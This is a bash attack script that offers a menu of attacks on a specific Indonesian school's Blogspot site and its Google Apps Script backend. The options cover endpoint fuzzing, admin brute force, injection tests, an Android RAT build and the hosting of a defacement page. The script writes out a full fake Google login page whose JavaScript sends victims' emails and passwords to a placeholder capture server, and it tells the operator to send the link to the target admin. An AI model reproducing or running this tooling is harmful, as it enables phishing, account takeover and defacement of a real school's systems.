#!/bin/bash

echo "╔═══════════════════════════════════════════════════╗"
echo "║   SMPN 3 Cibarusah - Complete Attack Package     ║"
echo "║   All-in-One Exploitation Script                 ║"
echo "╚═══════════════════════════════════════════════════╝"
echo ""

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

TARGET="https://script.google.com/macros/s/AKfycby1kIXK0_Unpfbs4k8vc4np0zSC3xaMn806bwGAHbLlApobcmhB3NV07UbAWtv_Gd53Zw/exec"
BLOGSPOT="https://smpnegeri3cibarusah.blogspot.com"

echo -e "${BLUE}[*] Target: $BLOGSPOT${NC}"
echo -e "${BLUE}[*] Backend: Google Apps Script${NC}"
echo ""

# Menu
echo "Select attack method:"
echo ""
echo "1. 🔍 Endpoint Discovery (Fuzzing)"
echo "2. 🔓 Brute Force Admin Login"
echo "3. 🎣 Setup Phishing Page"
echo "4. 💉 Test for XSS/SQLi"
echo "5. 📱 Build Android RAT"
echo "6. 🌐 Host Deface Page"
echo "7. 🚀 Full Automated Attack (All methods)"
echo "8. ℹ️  Show Documentation"
echo "9. 🚪 Exit"
echo ""

read -p "Enter choice [1-9]: " choice

case $choice in
    1)
        echo -e "\n${GREEN}[+] Running endpoint fuzzer...${NC}"
        python3 fuzz_apps_script.py
        ;;
    
    2)
        echo -e "\n${GREEN}[+] Starting brute force attack...${NC}"
        echo ""
        read -p "Use custom wordlist? (y/n): " use_custom
        if [ "$use_custom" = "y" ]; then
            read -p "Enter wordlist path: " wordlist
            python3 brute_admin.py "$wordlist"
        else
            python3 brute_admin.py
        fi
        ;;
    
    3)
        echo -e "\n${GREEN}[+] Setting up phishing page...${NC}"
        
        # Create phishing directory
        mkdir -p phishing
        
        # Clone Google login page
        echo "[*] Creating fake Google login..."
        cat > phishing/index.html << 'EOF'
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Masuk - Akun Google</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Roboto', Arial, sans-serif; background: #fff; }
        .container { max-width: 450px; margin: 100px auto; padding: 40px; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo h1 { color: #4285f4; font-size: 24px; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; color: #202124; font-size: 14px; }
        .form-group input { width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
        .form-group input:focus { outline: none; border-color: #1a73e8; }
        button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: 500; }
        button:hover { background: #1765cc; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #5f6368; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>Google</h1>
            <p>Masuk ke Google Apps Script</p>
        </div>
        <form id="loginForm" method="POST">
            <div class="form-group">
                <label>Email</label>
                <input type="email" name="email" required>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" required>
            </div>
            <button type="submit">Berikutnya</button>
        </form>
        <div class="footer">
            <p>© 2026 Google LLC</p>
        </div>
    </div>
    <script>
    document.getElementById('loginForm').onsubmit = function(e) {
        e.preventDefault();
        const email = this.email.value;
        const password = this.password.value;
        
        // Send to your server
        fetch('https://YOUR-SERVER.com/capture.php', {
            method: 'POST',
            body: JSON.stringify({email, password}),
            headers: {'Content-Type': 'application/json'}
        });
        
        // Redirect to real Google after 1 second
        setTimeout(() => {
            window.location = 'https://accounts.google.com';
        }, 1000);
    };
    </script>
</body>
</html>
EOF
        
        echo -e "${GREEN}[✓] Phishing page created: phishing/index.html${NC}"
        echo ""
        echo "Next steps:"
        echo "1. Edit phishing/index.html and change 'YOUR-SERVER.com' to your server"
        echo "2. Host the page: cd phishing && python3 -m http.server 8080"
        echo "3. Use ngrok for public URL: ngrok http 8080"
        echo "4. Send link to target admin"
        ;;
    
    4)
        echo -e "\n${GREEN}[+] Testing for injection vulnerabilities...${NC}"
        python3 fuzz_apps_script.py
        ;;
    
    5)
        echo -e "\n${GREEN}[+] Building Android RAT...${NC}"
        
        if [ ! -d "AndroidRAT" ]; then
            echo -e "${RED}[!] AndroidRAT directory not found${NC}"
            exit 1
        fi
        
        echo "[*] Make sure you've edited the Telegram bot token in MainActivity.java"
        read -p "Continue with build? (y/n): " continue_build
        
        if [ "$continue_build" = "y" ]; then
            cd AndroidRAT
            chmod +x gradlew
            ./gradlew clean assembleRelease
            cd ..
            
            echo ""
            echo -e "${GREEN}[✓] RAT built successfully${NC}"
            echo "Now sign the APK:"
            echo "  ./sign_apk.sh"
        fi
        ;;
    
    6)
        echo -e "\n${GREEN}[+] Hosting deface page...${NC}"
        echo ""
        echo "Choose hosting method:"
        echo "1. Local server (Python)"
        echo "2. GitHub Pages (requires git)"
        echo "3. Manual (show instructions)"
        read -p "Enter choice [1-3]: " host_choice
        
        case $host_choice in
            1)
                echo "[*] Starting local server on port 8000..."
                echo "[*] Your deface page will be at: http://localhost:8000/deface_page_smpn3.html"
                echo "[*] Use ngrok to get public URL: ngrok http 8000"
                python3 -m http.server 8000
                ;;
            
            2)
                echo "[*] Setting up GitHub Pages..."
                git init
                git add deface_page_smpn3.html
                git commit -m "Initial commit"
                echo ""
                echo "Now:"
                echo "1. Create a new repo on GitHub"
                echo "2. Run: git remote add origin https://github.com/YOUR-USERNAME/YOUR-REPO.git"
                echo "3. Run: git push -u origin main"
                echo "4. Enable GitHub Pages in repo settings"
                echo "5. Your page will be at: https://YOUR-USERNAME.github.io/YOUR-REPO/deface_page_smpn3.html"
                ;;
            
            3)
                echo ""
                echo "Manual hosting options:"
                echo ""
                echo "• Netlify: netlify.com (drag & drop)"
                echo "• Vercel: vercel.com (git integration)"
                echo "• Firebase Hosting: firebase.google.com"
                echo "• Your own VPS"
                echo ""
                echo "After hosting, inject redirect to Blogspot/Apps Script"
                ;;
        esac
        ;;
    
    7)
        echo -e "\n${YELLOW}[!] WARNING: Full automated attack${NC}"
        echo "This will run all attacks sequentially:"
        echo "  1. Endpoint fuzzing"
        echo "  2. Brute force with default passwords"
        echo "  3. Injection testing"
        echo ""
        read -p "Continue? (y/n): " confirm
        
        if [ "$confirm" = "y" ]; then
            echo -e "\n${GREEN}[+] Phase 1: Endpoint Discovery${NC}"
            python3 fuzz_apps_script.py > results_fuzz.txt
            
            echo -e "\n${GREEN}[+] Phase 2: Brute Force Attack${NC}"
            python3 brute_admin.py passwords_indo.txt > results_brute.txt
            
            echo -e "\n${GREEN}[+] Attack complete!${NC}"
            echo ""
            echo "Results saved:"
            echo "  - results_fuzz.txt (discovered endpoints)"
            echo "  - results_brute.txt (credential attempts)"
            echo ""
            
            if grep -q "CREDENTIALS FOUND" results_brute.txt; then
                echo -e "${GREEN}[✓] SUCCESS! Credentials found:${NC}"
                grep -A 3 "CREDENTIALS FOUND" results_brute.txt
                echo ""
                echo "Next step: Use credentials to login and deploy deface page"
            else
                echo -e "${RED}[!] No credentials found with default passwords${NC}"
                echo "Try:"
                echo "  - Custom wordlist"
                echo "  - Phishing attack"
                echo "  - Social engineering"
            fi
        fi
        ;;
    
    8)
        echo -e "\n${BLUE}[*] Available documentation:${NC}"
        echo ""
        echo "1. SMPN3_VULN_ASSESSMENT.md - Full vulnerability report"
        echo "2. EXPLOITATION_GUIDE.md - Step-by-step exploitation"
        echo "3. README.md - Android RAT & Phishing setup"
        echo "4. SETUP_TELEGRAM.md - Telegram bot configuration"
        echo ""
        read -p "View which document? [1-4]: " doc_choice
        
        case $doc_choice in
            1) less SMPN3_VULN_ASSESSMENT.md ;;
            2) less EXPLOITATION_GUIDE.md ;;
            3) less README.md ;;
            4) less SETUP_TELEGRAM.md ;;
        esac
        ;;
    
    9)
        echo -e "\n${BLUE}Goodbye!${NC}"
        exit 0
        ;;
    
    *)
        echo -e "${RED}[!] Invalid choice${NC}"
        exit 1
        ;;
esac

echo ""
echo -e "${GREEN}[✓] Operation complete!${NC}"
